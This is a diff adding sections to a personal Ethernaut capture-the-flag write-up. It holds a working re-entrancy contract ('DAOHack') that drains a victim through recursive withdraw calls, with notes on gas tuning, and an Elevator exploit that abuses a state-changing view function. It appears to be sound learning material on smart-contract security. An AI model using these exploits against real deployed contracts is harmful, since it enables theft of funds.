@@ -120,10 +120,76 @@ contract KingForever {
 
 ## 10. Re-entrancy
 The same hack as the DAO hack. Due to the ordering of the transactions, the malicious contract is able to keep calling the withdraw function as the internal state is not updated. When the call.value is processed, the control is handed back to the fallback function of the malicious contract which then calls the withdraw function again.
+Note that the number of times the fallback function runs is based on the amt of gas submitted when you call "bleedItEmpty". For example, running bleedItEmpty with 1 mil gas let me run my fallback function 29 times. Increasing it to 2 mil let me run it 47 times. 
+
+You shouldn't try and give it like 7.8mil gas and try running it because it might reach the maximum stack size exceeded error. Just increase the amount of ether you withdraw each time!
+
+Also, not sure why the other approach (calling function via address.call() doesn't work for withdraw but it works for donating)
+```
+pragma solidity ^0.4.24;
+
+import "./Reentrance.sol";
+
+contract DAOHack {
+    
+    Reentrance private _victim;
+    
+    constructor(address victim) public {
+        _victim = Reentrance(victim);
+    }
+    
+    function pretendToDonate() public payable {
+        _victim.donate.value(msg.value)(address(this));
+    }
+    
+    function bleedItEmpty() public {
+        _victim.withdraw(0.5 ether);
+    }
+    
+    function() public payable {
+        bleedItEmpty();
+    }
+    
+    function checkBalance() public view returns(uint) {
+        return address(this).balance;
+    }
+    
+}
 ```
 
-```
+## 11. Elevator
+Actually this one surprised me a little. I knew how to make top true but I didn't know what the problem is until I read further. Apparently, the older version of the solidity compiler does not ensure that view, constant or pure functions modify state. For example, as of 0.4.25, the compiler only prompts an error if your view function modifies state. However, when I tried it with 0.4.17, no prompt is triggered.
 
+https://solidity.readthedocs.io/en/develop/contracts.html#view-functions
+https://medium.com/coinmonks/ethernaut-lvl-11-elevator-walkthrough-how-to-abuse-solidity-interfaces-and-function-state-41005470121d
+```
+pragma solidity ^0.4.18;
+
+import "./Elevator.sol";
+
+contract SingleFloor is Building {
+    bool private iCheated = false;
+    Elevator private _target;
+    
+    constructor(address target) public { 
+        _target = Elevator(target);
+    }
+    
+    function goLastFloor(uint floor) public {
+        _target.goTo(floor);
+    }
+    
+    function isLastFloor(uint) view public returns (bool) {
+        if(!iCheated) {
+            iCheated = true;
+            return false;
+        }
+        return true;
+    }
+}
+
+
+```
 
 
 
